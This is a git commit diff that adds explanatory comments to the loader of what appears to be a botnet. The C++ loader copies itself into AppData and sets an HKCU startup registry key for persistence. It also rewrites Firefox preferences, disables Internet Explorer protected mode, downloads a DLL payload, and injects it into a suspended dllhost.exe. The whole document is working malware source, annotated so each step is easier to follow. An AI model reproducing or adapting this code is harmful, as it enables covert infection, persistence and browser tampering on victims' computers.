5211f74bfdbed006e61e7c7e4f315e5e1d933ef6
srbgd <alkkoloto@yandex.ru>
2018-06-16 16:05:43 +0300

    commented loader

--- Loader/Main.cpp
+++ Loader/Main.cpp
@@ -4,11 +4,15 @@
 
 #define RUN_DEBUG FALSE
 
+// install the bot on pc
+// path is the path to current bots executable file
 static void Install(char *path)
 {
-   //melt
+   // melt
    char temp[MAX_PATH];
+   // put the path to the file with name botid in temp folder in temp buffer
    GetTempPathBotPrefix(temp);
+   // crate this file
    HANDLE hFile = Funcs::pCreateFileA
    (
       temp, 
@@ -20,13 +24,17 @@ static void Install(char *path)
       NULL
    );
    DWORD written;
+   // write there the path to current bots PE file (this file is not used later. may be useless part of code)
    Funcs::pWriteFile(hFile, path, Funcs::pLstrlenA(path), &written, NULL);
    Funcs::pCloseHandle(hFile);
    //end melt
 
    char installPath[MAX_PATH] = { 0 };
+   // get the path of appdata + botid folder + botid exe
    GetInstallPath(installPath);
+   // copy itself there
    Funcs::pCopyFileA(path, installPath, FALSE);
+   // put itself in startup registry branch in HKCU
    SetStartupValue(installPath);
 
    STARTUPINFOA        startupInfo = { 0 };
@@ -34,22 +42,31 @@ static void Install(char *path)
 
    startupInfo.cb = sizeof(startupInfo);
 
+   // run previously copied file in appdata
    Funcs::pCreateProcessA(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
 }
 
+
+// download and execute main payload
 static void Run()
 {
+   // replace prefs.js file
    SetFirefoxPrefs();
+   // edit registry values responsible for IE safety
    DisableMultiProcessesAndProtectedModeIe();
+   // initialize critical section respponsible for http communication
    InitPanelRequest();
    BYTE *mainPluginPe = NULL;
    
+   // download x86 dll
    GetDlls(&mainPluginPe, NULL, FALSE);
 
    char dllhostPath[MAX_PATH] = { 0 };
    
+   // get system folder
    Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, dllhostPath);
 
+   // get path to dllhost.exe
    Funcs::pLstrcatA(dllhostPath, Strs::fileDiv);
    Funcs::pLstrcatA(dllhostPath, Strs::dllhostExe);
 
@@ -58,17 +75,23 @@ static void Run()
 
    startupInfo.cb = sizeof(startupInfo);
 
+   // run dllhost.exe
    Funcs::pCreateProcessA(dllhostPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo); 
+   // inject downloaded dll in dllhost.exe (always x86)
    InjectDll(mainPluginPe, processInfo.hProcess, FALSE);
 }
 
+
+// entry point of loader.exe
 void Entry()
 {
+   // initialize strings and functions
    InitApi();
    char  botId  [BOT_ID_LEN] = { 0 };
    char  exePath[MAX_PATH]   = { 0 };
    char *exeName;
    GetBotId(botId);
+   // check if the process already exists
    HANDLE hMutex = Funcs::pCreateMutexA(NULL, TRUE, botId);
    if(Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
       Funcs::pExitProcess(0);
@@ -77,11 +100,16 @@ void Entry()
 #if(RUN_DEBUG)
    Run();
 #else
+   // get path to current exe
    Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);
+   // get name of current exe
    exeName = Funcs::pPathFindFileNameA(exePath);
+   // check if the bot already installed by comparing its name and botid
    if(Funcs::pStrncmp(botId, exeName, Funcs::pLstrlenA(botId)) != 0)
+      // first launch
       Install(exePath);
    else
+      // other launches
       Run();
 #endif
    Funcs::pExitProcess(0);
